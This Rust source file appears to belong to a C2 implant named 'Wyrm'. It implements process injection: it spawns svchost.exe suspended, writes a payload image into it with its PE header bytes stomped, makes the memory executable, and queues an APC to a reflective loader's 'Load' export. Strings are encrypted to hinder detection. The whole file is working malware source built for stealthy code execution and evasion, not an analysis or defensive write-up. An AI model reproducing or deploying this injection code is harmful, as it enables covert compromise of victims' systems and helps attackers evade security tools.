use std::{
    ffi::c_void,
    mem::transmute,
    ptr::{null_mut, read_unaligned},
};

use shared::tasks::WyrmResult;
use str_crypter::{decrypt_string, sc};
use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
                VirtualProtectEx,
            },
            SystemServices::IMAGE_DOS_HEADER,
            Threading::{
                CREATE_SUSPENDED, CreateProcessA, GetProcessId, PROCESS_INFORMATION, QueueUserAPC,
                ResumeThread, STARTUPINFOA,
            },
        },
    },
    core::PCSTR,
};

use crate::{
    dbgprint,
    utils::{export_resolver::find_export_from_unmapped_file, pe_stomp::stomp_pe_header_bytes},
};

const SPAWN_AS_IMAGE: &str = "C:\\Windows\\System32\\notepad.exe\0";

pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
    //
    // Create the process in a suspended state, using the image specified by either the user (TODO) or
    // svchost as the default image.
    //
    let mut pi = PROCESS_INFORMATION::default();
    let mut si = STARTUPINFOA::default();
    si.cb = size_of::<STARTUPINFOA>() as u32;

    let mut cmd = b"C:\\Windows\\System32\\svchost.exe\0".to_vec();

    let image_path = PCSTR::from(SPAWN_AS_IMAGE.as_ptr() as _);

    let result_create_process = unsafe {
        CreateProcessA(
            null_mut(),
            cmd.as_mut_ptr(),
            null_mut(),
            null_mut(),
            FALSE,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &si as *const STARTUPINFOA,
            &mut pi as *mut PROCESS_INFORMATION,
        )
    };

    // Check if we were successful..
    if result_create_process == 0 {
        let msg = format!(
            "{} {:#X}",
            sc!("Failed to create process. Error code:", 71).unwrap(),
            unsafe { GetLastError() }
        );

        #[cfg(debug_assertions)]
        {
            use shared::pretty_print::print_failed;

            print_failed(&msg);
        }

        return WyrmResult::Err::<String>(msg);
    }

    let pid = unsafe { GetProcessId(pi.hProcess) };
    if pid == 0 {
        println!("Handle was invalid");
        return WyrmResult::Err(unsafe { GetLastError() }.to_string());
    }

    println!(
        "hProcess = 0x{:X}, hThread = 0x{:X}, pid={}",
        pi.hProcess as usize,
        pi.hThread as usize,
        unsafe { GetProcessId(pi.hProcess) }
    );

    //
    // Allocate the memory + copy our process image in (stomping some indicators in the process of)
    //

    let p_alloc = match write_image_rw(pi.hProcess, &mut buf) {
        Ok(p) => p,
        Err(e) => {
            let msg = format!(
                "{} {e:#X}",
                sc!("Failed to write process memory:", 71).unwrap()
            );

            #[cfg(debug_assertions)]
            {
                use shared::pretty_print::print_failed;

                print_failed(&msg);
            }

            unsafe { CloseHandle(pi.hThread) };
            unsafe { CloseHandle(pi.hProcess) };

            return WyrmResult::Err::<String>(msg);
        }
    };

    //
    // Now the image is loaded in memory; we are either looking for the address of entrypoint of the PE,
    // or the reflective loader export "Load".
    //

    let Some(p_start) = find_start_address(&buf, p_alloc as _) else {
        println!("Failed to find start address");
        return WyrmResult::Err("Failed to find start".to_string());
    };

    // Mark memory RWX

    let mut old_protect = 0;
    let _ = unsafe {
        VirtualProtectEx(
            pi.hProcess,
            p_alloc,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };

    let result_queue_apc = match p_start {
        StartAddress::Load(addr) => {
            // With this variant we need to include an argument to the starting thread which is the base
            // address of the allocation for the reflective loader to do its business
            let p_thread_start: unsafe extern "system" fn(usize) = unsafe { transmute(addr) };
            unsafe { QueueUserAPC(Some(p_thread_start), pi.hThread, p_alloc as usize) }
        }
        StartAddress::AddressOfEntryPoint(addr) => {
            let p_thread_start: unsafe extern "system" fn(usize) = unsafe { transmute(addr) };
            unsafe { QueueUserAPC(Some(p_thread_start), pi.hThread, 0) }
        }
    };

    // Error check
    if result_queue_apc == 0 {
        let msg = format!(
            "{} {:#X}",
            sc!("Failed to run QueueUserApc:", 71).unwrap(),
            unsafe { GetLastError() }
        );

        #[cfg(debug_assertions)]
        {
            use shared::pretty_print::print_failed;

            print_failed(&msg);
        }

        unsafe { CloseHandle(pi.hThread) };
        unsafe { CloseHandle(pi.hProcess) };

        return WyrmResult::Err::<String>(msg);
    }

    // TODO better opsec option?
    unsafe { ResumeThread(pi.hThread) };

    unsafe { CloseHandle(pi.hThread) };
    unsafe { CloseHandle(pi.hProcess) };
    WyrmResult::Ok(sc!("Process created.", 19).unwrap())
}

enum StartAddress {
    Load(*const c_void),
    AddressOfEntryPoint(*const c_void),
}

/// Finds the start address of the loaded image to use reflectively. The start address returned is the starting address from
/// the **INPUT BUFFER** which does not account for the offset of the memory allocation. You must calculate
/// that yourself.
///
/// # Args
/// `buf`: The user specified buffer containing an image to search through
/// `base_original_allocation`: A pointer to the actual memory allocation which is used to compute the actual start address
///   accounting for allocation size etc.
fn find_start_address(buf: &Vec<u8>, base_original_allocation: *const u8) -> Option<StartAddress> {
    //
    // The strategy here will be first to search for the "Load" export. If the image does not have this export, the fallback
    // option will be to return the AddressOfEntrypoint.
    //
    // This should allow the Wyrm loader (no Load function), the raw Wyrm payload, and custom loaders to run.
    // TODO write some docs for this requirement.
    //

    if buf.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        println!("Buffer too small! Sz: {}", buf.len());
    }

    let dos = unsafe { read_unaligned(buf.as_ptr() as *const IMAGE_DOS_HEADER) };
    let nt_ptr = unsafe { buf.as_ptr().add(dos.e_lfanew as usize) } as *const u8;

    match find_export_from_unmapped_file(buf.as_ptr() as _, nt_ptr as _, "Load") {
        Some(p) => {
            dbgprint!("Found export address at: {p:p}");
            let addr = calculate_memory_delta(buf.as_ptr() as usize, p as usize)?;
            let addr_calculated = unsafe { base_original_allocation.add(addr) };
            dbgprint!("Calculated offset: {addr_calculated:p}");
            Some(StartAddress::Load(addr_calculated as _))
        }
        None => {
            dbgprint!("DID NOT FIND EXPORT ADDRESS");
            return None;
            // Use AddressOfEntrypoint instead
            // let address_entry_rva = unsafe { *mapped_nt_ptr }.OptionalHeader.AddressOfEntryPoint;
            // let p_fn_start = unsafe { p_base.add(address_entry_rva as usize) };
            // let addr = calculate_memory_delta(p_base as _, p_fn_start as _)?;
            // let addr_calculated = unsafe { base_original_allocation.add(addr) };
            // Some(StartAddress::AddressOfEntryPoint(addr_calculated as _))
        }
    }
}

fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> Option<usize> {
    let res = fn_ptr_address.saturating_sub(buf_start_address);

    if res == 0 {
        return None;
    }

    Some(res)
}

/// Allocates and writes memory pages in a remote process with `PAGE_READWRITE` protection
/// with the content of some user specified buffer.
///
/// # Returns
/// If successful will return the address of the allocation; if it fails, will return the error
/// produced from calling `GetLastError`
fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void, u32> {
    let pid = unsafe { GetProcessId(h_process) };
    println!(
        "[write_image_rw] h_process=0x{:X} pid={}",
        h_process as usize, pid
    );
    if pid == 0 {
        let gle = unsafe { GetLastError() };
        println!("[write_image_rw] GetProcessId failed gle=0x{:X}", gle);
        return Err(gle);
    }

    let p_alloc = unsafe {
        VirtualAllocEx(
            h_process,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if p_alloc.is_null() {
        println!("{}", sc!("Failed to run VirtualAllocEx", 97).unwrap());
        return Err(unsafe { GetLastError() });
    }

    //
    // Before copying the memory we will stomp some indicators that we are injecting a PE
    // such as the MZ and "This program.."
    //
    stomp_pe_header_bytes(buf);

    //
    // Now write the memory
    //

    let res =
        unsafe { WriteProcessMemory(h_process, p_alloc, buf.as_ptr() as _, buf.len(), null_mut()) };

    if res == 0 {
        println!("{}", sc!("Failed to run WriteProcessMemory", 97).unwrap());
        return Err(unsafe { GetLastError() });
    }

    Ok(p_alloc)
}
